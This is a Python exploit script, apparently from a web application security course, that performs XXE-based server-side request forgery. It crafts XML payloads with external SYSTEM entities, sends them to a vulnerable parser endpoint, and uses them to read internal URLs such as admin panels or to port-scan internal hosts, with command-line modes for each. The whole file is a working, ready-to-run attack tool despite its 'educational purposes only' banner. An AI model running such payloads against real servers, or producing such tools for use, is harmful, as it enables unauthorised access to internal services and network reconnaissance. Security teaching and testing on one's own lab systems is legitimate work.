#!/usr/bin/env python3
"""
XXE SSRF (Server-Side Request Forgery) Exploit
===============================================

This script demonstrates XXE-based SSRF attacks, forcing the server
to make HTTP requests to internal resources or scan ports.

EDUCATIONAL PURPOSES ONLY!
Do not use against systems you don't have permission to test.

Author: Adrian Kapczynski
Course: Web and Mobile Application Security Testing
"""

import requests
import sys
import argparse
import json
from urllib.parse import urljoin
import time


class XXESSRF:
    """
    XXE exploit for Server-Side Request Forgery attacks
    """

    def __init__(self, target_url, verbose=False):
        """
        Initialize the exploit

        Args:
            target_url (str): Base URL of the vulnerable application
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.verbose = verbose
        self.endpoint = urljoin(target_url, '/api/parse')

    def log(self, message):
        """Print message if verbose mode is enabled"""
        if self.verbose:
            print(f"[*] {message}")

    def create_ssrf_payload(self, target_host, target_port=None):
        """
        Create XXE payload for SSRF attack

        Args:
            target_host (str): Target host/IP to request
            target_port (int): Target port (optional)

        Returns:
            str: XML payload with SSRF entity
        """
        if target_port:
            url = f"http://{target_host}:{target_port}/"
        else:
            url = target_host if target_host.startswith('http') else f"http://{target_host}"

        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<data>&xxe;</data>"""
        return payload

    def exploit_single(self, target_host, target_port=None):
        """
        Execute SSRF attack against a single target

        Args:
            target_host (str): Target host/IP
            target_port (int): Target port (optional)

        Returns:
            tuple: (success: bool, response: str, status: str)
        """
        target = f"{target_host}:{target_port}" if target_port else target_host
        self.log(f"Targeting: {target}")

        # Create payload
        payload = self.create_ssrf_payload(target_host, target_port)
        self.log("Payload created")

        if self.verbose:
            print("\n" + "=" * 60)
            print("PAYLOAD:")
            print("=" * 60)
            print(payload)
            print("=" * 60 + "\n")

        try:
            # Send request
            self.log("Sending SSRF exploit...")

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'XXE-SSRF-Exploit/1.0'
            }

            response = requests.post(
                self.endpoint,
                data={'xml_content': payload},
                headers=headers,
                timeout=5,
                allow_redirects=True
            )

            self.log(f"Response status: {response.status_code}")

            if response.status_code == 200:
                try:
                    json_data = response.json()

                    if json_data.get('success'):
                        parsed_data = json_data.get('parsed_data', {})
                        content = parsed_data.get('text_content', '')

                        if not content:
                            content = parsed_data.get('xml_string', '')

                        # Check if we got actual response
                        if content and content.strip():
                            return True, content, "ACCESSIBLE"
                        else:
                            # Empty response might mean port is open but no HTTP service
                            return True, "", "OPEN (no HTTP response)"
                    else:
                        # Error might indicate connection refused or timeout
                        error = json_data.get('error', '')
                        if 'refused' in error.lower():
                            return False, error, "CLOSED"
                        elif 'timeout' in error.lower():
                            return False, error, "FILTERED/TIMEOUT"
                        else:
                            return False, error, "ERROR"

                except json.JSONDecodeError:
                    return False, "JSON decode error", "ERROR"
            else:
                return False, f"HTTP {response.status_code}", "ERROR"

        except requests.exceptions.Timeout:
            return False, "Request timeout", "FILTERED/TIMEOUT"
        except requests.exceptions.RequestException as e:
            return False, str(e), "ERROR"

    def port_scan(self, target_host, ports):
        """
        Scan multiple ports on target host

        Args:
            target_host (str): Target host to scan
            ports (list): List of ports to scan

        Returns:
            dict: Results of port scan
        """
        results = {}
        total = len(ports)

        print(f"\n[+] Scanning {total} ports on {target_host}...")
        print("=" * 60)

        for i, port in enumerate(ports, 1):
            print(f"[{i}/{total}] Checking port {port}...", end=' ')
            sys.stdout.flush()

            success, response, status = self.exploit_single(target_host, port)
            results[port] = {
                'status': status,
                'accessible': success,
                'response_preview': response[:100] if response else None
            }

            if success:
                print(f"✅ {status}")
            else:
                print(f"❌ {status}")

            # Small delay to avoid overwhelming the server
            time.sleep(0.1)

        return results

    def access_internal_endpoint(self, endpoint_url):
        """
        Try to access an internal endpoint

        Args:
            endpoint_url (str): Full URL to access

        Returns:
            tuple: (success: bool, content: str)
        """
        # For internal endpoints, we pass full URL
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{endpoint_url}">
]>
<data>&xxe;</data>"""

        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'XXE-SSRF-Exploit/1.0'
            }

            response = requests.post(
                self.endpoint,
                data={'xml_content': payload},
                headers=headers,
                timeout=5
            )

            if response.status_code == 200:
                json_data = response.json()
                if json_data.get('success'):
                    parsed_data = json_data.get('parsed_data', {})
                    content = parsed_data.get('text_content', '') or parsed_data.get('xml_string', '')
                    return True, content

            return False, "Could not access endpoint"

        except Exception as e:
            return False, str(e)


def print_banner():
    """Print exploit banner"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║              XXE SSRF Exploit                             ║
║       Server-Side Request Forgery via XXE                 ║
║                                                           ║
║           [!] EDUCATIONAL PURPOSES ONLY [!]              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    """Main function"""
    print_banner()

    parser = argparse.ArgumentParser(
        description='XXE SSRF Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single endpoint access
  python ssrf_attack.py -t http://127.0.0.1:5000 -u http://127.0.0.1:5000/health

  # Port scanning
  python ssrf_attack.py -t http://127.0.0.1:5000 --scan localhost --ports 80,443,8080,3306,5432

  # Common ports scan
  python ssrf_attack.py -t http://127.0.0.1:5000 --scan localhost --common-ports

  # Access internal admin panel
  python ssrf_attack.py -t http://127.0.0.1:5000 -u http://127.0.0.1:5000/admin

Attack Modes:
  1. Single endpoint: Access specific internal URL
  2. Port scan: Discover open ports on target host
        """
    )

    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Vulnerable application URL (e.g., http://127.0.0.1:5000)'
    )

    parser.add_argument(
        '-u', '--url',
        help='Internal URL to access via SSRF'
    )

    parser.add_argument(
        '--scan',
        help='Target host to port scan (e.g., localhost, 127.0.0.1, 192.168.1.1)'
    )

    parser.add_argument(
        '--ports',
        help='Comma-separated list of ports to scan (e.g., 80,443,8080)'
    )

    parser.add_argument(
        '--common-ports',
        action='store_true',
        help='Scan common ports (21,22,23,25,80,443,3306,5432,6379,8080,8443)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )

    args = parser.parse_args()

    # Create exploit instance
    exploit = XXESSRF(args.target, verbose=args.verbose)

    # Mode 1: Access internal endpoint
    if args.url:
        print(f"\n[+] SSRF Attack Mode: Internal Endpoint Access")
        print(f"[+] Target Application: {args.target}")
        print(f"[+] Internal URL: {args.url}")
        print("[+] Launching SSRF attack...\n")

        success, content = exploit.access_internal_endpoint(args.url)

        if success:
            print("=" * 60)
            print("✅ SSRF SUCCESSFUL!")
            print("=" * 60)
            print("\nINTERNAL RESPONSE:")
            print("-" * 60)
            print(content)
            print("-" * 60)
            print(f"\n[+] Successfully accessed internal endpoint via SSRF!")
        else:
            print("=" * 60)
            print("❌ SSRF FAILED")
            print("=" * 60)
            print(f"\nError: {content}")
            sys.exit(1)

    # Mode 2: Port scanning
    elif args.scan:
        if args.common_ports:
            ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]
        elif args.ports:
            try:
                ports = [int(p.strip()) for p in args.ports.split(',')]
            except ValueError:
                print("❌ Error: Invalid port format. Use comma-separated numbers.")
                sys.exit(1)
        else:
            print("❌ Error: Specify --ports or --common-ports for scanning")
            sys.exit(1)

        print(f"\n[+] SSRF Attack Mode: Port Scanning")
        print(f"[+] Target Application: {args.target}")
        print(f"[+] Scan Target: {args.scan}")
        print(f"[+] Ports to scan: {len(ports)}")

        results = exploit.port_scan(args.scan, ports)

        # Summary
        print("\n" + "=" * 60)
        print("SCAN RESULTS SUMMARY")
        print("=" * 60)

        open_ports = [p for p, r in results.items() if r['accessible']]
        closed_ports = [p for p, r in results.items() if r['status'] == 'CLOSED']
        filtered_ports = [p for p, r in results.items() if 'FILTERED' in r['status'] or 'TIMEOUT' in r['status']]

        print(f"\n✅ Open/Accessible: {len(open_ports)}")
        if open_ports:
            for port in open_ports:
                print(f"   - Port {port}: {results[port]['status']}")

        print(f"\n❌ Closed: {len(closed_ports)}")
        if closed_ports and args.verbose:
            for port in closed_ports:
                print(f"   - Port {port}")

        print(f"\n⏳ Filtered/Timeout: {len(filtered_ports)}")
        if filtered_ports and args.verbose:
            for port in filtered_ports:
                print(f"   - Port {port}")

        print("\n" + "=" * 60)
        print(f"[+] Port scan completed via XXE SSRF vulnerability!")

    else:
        print("\n❌ Error: Specify either --url for endpoint access or --scan for port scanning")
        print("Use -h for help")
        sys.exit(1)


if __name__ == '__main__':
    main()